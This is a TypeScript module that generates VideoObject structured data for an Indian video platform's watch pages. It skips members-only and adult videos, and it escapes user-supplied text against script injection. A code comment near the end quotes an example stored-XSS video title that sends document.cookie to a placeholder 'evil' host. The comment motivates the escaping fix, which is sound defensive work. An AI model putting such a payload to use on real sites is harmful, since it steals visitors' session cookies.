// VideoObject structured data for watch pages.
//
// WHY: Search Console reported "Discovered videos: 0" for the whole sitemap
// and "No video indexed" for the homepage. For a video platform that is the
// difference between a plain blue link and a result with a thumbnail, a
// duration badge and a play affordance — which is what actually earns the
// click on a video query. None of it is possible without this markup; the
// watch pages carried none.
//
// Google's REQUIRED properties for a video rich result are exactly three:
// name, thumbnailUrl, uploadDate. Everything else here is on their
// recommended list. Anything that cannot be stated truthfully is omitted
// rather than guessed — a wrong contentUrl earns a warning in Search
// Console and buys nothing.
//
// PURE MODULE: no DynamoDB, no next/*, so the watch page and any future
// caller (a Shorts page, an API) share one definition of what an InPlayer
// video looks like to a search engine.

const SITE_URL = "https://inplayer.in";

/** Seconds → ISO 8601 duration ("PT1M33S"), the only format Google accepts
 *  for `duration`. Returns null for anything unusable, so the property is
 *  omitted rather than emitted wrong. */
export function secondsToIso8601Duration(seconds: unknown): string | null {
  if (typeof seconds !== "number" || !Number.isFinite(seconds) || seconds <= 0) {
    return null;
  }
  const total = Math.round(seconds);
  const h = Math.floor(total / 3600);
  const m = Math.floor((total % 3600) / 60);
  const s = total % 60;

  // "PT" alone would be invalid, but that can't happen here: total >= 1.
  return `PT${h ? `${h}H` : ""}${m ? `${m}M` : ""}${s ? `${s}S` : ""}`;
}

/** An ISO timestamp Google will accept, or null. Rows written before the
 *  current upload flow can carry junk here, and a malformed uploadDate
 *  invalidates the whole VideoObject — so it is checked, not trusted. */
export function toIsoDate(value: unknown): string | null {
  if (typeof value !== "string" || !value.trim()) return null;
  const ms = new Date(value).getTime();
  return Number.isFinite(ms) ? new Date(ms).toISOString() : null;
}

// Google asks for thumbnails in several aspect ratios (16x9, 4x3, 1x1) and
// prefers large ones; its documented minimum is tiny (60x30) but small
// images simply don't get chosen for a rich result. Mux renders any crop on
// demand from the playback ID, so all of these cost nothing to offer.
//
// Shorts are 9:16 source video. Asking Mux for a 16:9 crop of a portrait
// frame is how the Shorts row ended up with squashed thumbnails once before
// (see muxThumbnail.ts) — so portrait content gets portrait crops.
function muxThumbnailSet(playbackId: string, isPortrait: boolean): string[] {
  const base = `https://image.mux.com/${encodeURIComponent(playbackId)}/thumbnail.jpg`;
  const sizes: [number, number][] = isPortrait
    ? [
        [1080, 1920], // 9:16 — the native shape
        [1080, 1080], // 1:1
      ]
    : [
        [1920, 1080], // 16:9 — the native shape
        [1440, 1080], // 4:3
        [1080, 1080], // 1:1
      ];

  return sizes.map(
    ([w, h]) => `${base}?width=${w}&height=${h}&fit_mode=smartcrop&time=1`
  );
}

/** True when this URL is a frame Mux rendered for this asset, whatever crop
 *  or format it was requested in — as opposed to an image a creator
 *  actually uploaded. Prefix match on purpose: it stays correct across
 *  every past and future change to the generated query string. */
function isGeneratedMuxThumbnail(url: string, playbackId: string): boolean {
  return url.startsWith(`https://image.mux.com/${encodeURIComponent(playbackId)}/`);
}

export interface VideoSchemaInput {
  videoId: string;
  title?: unknown;
  description?: unknown;
  uploadedAt?: unknown;
  /** Seconds, written by the Mux webhook once the asset is ready. */
  duration?: unknown;
  views?: unknown;
  thumbnailUrl?: unknown;
  /** The PUBLIC playback ID. Callers must pass undefined when publishing it
   *  would be unsafe — see the members-only rule below. */
  muxPlaybackId?: unknown;
  contentType?: unknown;
  uploaderName?: unknown;
  uploaderUsername?: unknown;
  membersOnly?: unknown;
  /** "adult" | "kids" | "everyone" — from app/lib/contentAccess. */
  audience?: string;
}

/**
 * Builds the VideoObject, or returns null when this video should not be
 * described to a search engine at all.
 *
 * Returns null for:
 *
 *  - MEMBERS-ONLY VIDEOS. Not a Google rule — a safety one. Every non-Short
 *    asset is created with BOTH a public and a signed playback policy (see
 *    app/api/upload/create/route.ts), and the paywall works purely by
 *    withholding the public ID from the page. Publishing Mux-derived URLs
 *    for one would hand out that ID and make the paywall bypassable. Google
 *    does support paywalled-video markup, but it is not worth that risk for
 *    content Google cannot watch anyway.
 *
 *  - 18+ VIDEOS. Googlebot carries no audience cookie, so it lands in the
 *    default "family" mode and the watch page serves it the hidden-content
 *    gate, not a player. Describing a video that isn't on the page Google
 *    actually receives is exactly the mismatch structured-data guidelines
 *    forbid.
 *
 *  - Anything missing one of Google's three required properties.
 */
export function buildVideoJsonLd(
  video: VideoSchemaInput
): Record<string, unknown> | null {
  if (video.membersOnly === true) return null;
  if (video.audience === "adult") return null;

  const name = typeof video.title === "string" ? video.title.trim() : "";
  const uploadDate = toIsoDate(video.uploadedAt);
  if (!name || !uploadDate) return null;

  const isPortrait = video.contentType === "short";
  const playbackId =
    typeof video.muxPlaybackId === "string" && video.muxPlaybackId.trim()
      ? video.muxPlaybackId.trim()
      : null;

  const storedThumbnail =
    typeof video.thumbnailUrl === "string" && video.thumbnailUrl.trim()
      ? video.thumbnailUrl.trim()
      : null;

  // Prefer the generated set (bigger, and in the ratios Google asks for).
  // Fall back to whatever single thumbnail is stored — which, for a video
  // with a creator-uploaded custom thumbnail, is the only correct one.
  const thumbnails: string[] = playbackId
    ? muxThumbnailSet(playbackId, isPortrait)
    : storedThumbnail
      ? [storedThumbnail]
      : [];

  // A creator's custom thumbnail is what viewers actually see on the card,
  // so it leads the list when there is one. Anything Mux generated is
  // skipped — the set above already covers those frames at far higher
  // resolution.
  //
  // The test is "is this a Mux image URL for this playback ID", NOT
  // "does it equal the URL getMuxThumbnailUrl would build right now".
  // Those differ: getMuxThumbnailUrl's crop parameters have changed at
  // least once already (Shorts moved from a 640x360 landscape crop to
  // 640x1138 portrait — see muxThumbnail.ts), so every Short stored before
  // that change has a LANDSCAPE generated URL on its row. An equality check
  // would read those as creator uploads and lead the list with the exact
  // squashed crop that change existed to stop using.
  if (playbackId && storedThumbnail && !isGeneratedMuxThumbnail(storedThumbnail, playbackId)) {
    thumbnails.unshift(storedThumbnail);
  }

  if (thumbnails.length === 0) return null;

  const description =
    typeof video.description === "string" && video.description.trim()
      ? video.description.trim().slice(0, 500)
      : `Watch "${name}" on INPLAYER.`;

  const canonical = `${SITE_URL}/watch/${video.videoId}`;
  const duration = secondsToIso8601Duration(video.duration);
  const views =
    typeof video.views === "number" && Number.isFinite(video.views) && video.views >= 0
      ? Math.round(video.views)
      : null;

  const uploaderName =
    typeof video.uploaderName === "string" && video.uploaderName.trim()
      ? video.uploaderName.trim()
      : null;
  const uploaderUsername =
    typeof video.uploaderUsername === "string" && video.uploaderUsername.trim()
      ? video.uploaderUsername.trim()
      : null;

  return {
    "@context": "https://schema.org",
    "@type": "VideoObject",
    "@id": canonical,
    url: canonical,
    name,
    description,
    thumbnailUrl: thumbnails,
    uploadDate,
    ...(duration ? { duration } : {}),
    // Honest, and genuinely useful to Google: the whole platform is
    // India-only (see middleware.ts), so this is the accurate answer to
    // "where can this be watched" rather than an omission Google guesses at.
    regionsAllowed: "IN",
    isFamilyFriendly: video.audience !== "adult",
    inLanguage: "en-IN",
    isAccessibleForFree: true,
    publisher: {
      "@type": "Organization",
      name: "INPLAYER",
      url: SITE_URL,
      logo: {
        "@type": "ImageObject",
        url: `${SITE_URL}/logos/inplayer-full.png`,
      },
    },
    ...(uploaderName
      ? {
          creator: {
            "@type": "Person",
            name: uploaderName,
            ...(uploaderUsername ? { url: `${SITE_URL}/u/${uploaderUsername}` } : {}),
          },
        }
      : {}),
    ...(views !== null
      ? {
          interactionStatistic: {
            "@type": "InteractionCounter",
            interactionType: { "@type": "https://schema.org/WatchAction" },
            userInteractionCount: views,
          },
        }
      : {}),
  };
}

// Serialising JSON-LD that contains USER-SUPPLIED TEXT.
//
// This is a real injection hole, not a theoretical one. JSON.stringify does
// NOT escape "<", so a video titled
//
//     </script><script>fetch('https://evil/?c='+document.cookie)</script>
//
// would close the JSON-LD block and run as page script for every visitor —
// stored XSS, authored through the ordinary upload form. The Organization
// block in app/layout.tsx is safe from this only because it is entirely
// static text; nothing here is.
//
// Escaping the three characters that can terminate or reopen a script
// context closes it. They remain valid JSON: "<" parses back to "<",
// so Google reads the original title unchanged.
export function serializeJsonLd(data: Record<string, unknown>): string {
  return JSON.stringify(data)
    .replace(/</g, "\\u003c")
    .replace(/>/g, "\\u003e")
    .replace(/&/g, "\\u0026");
}
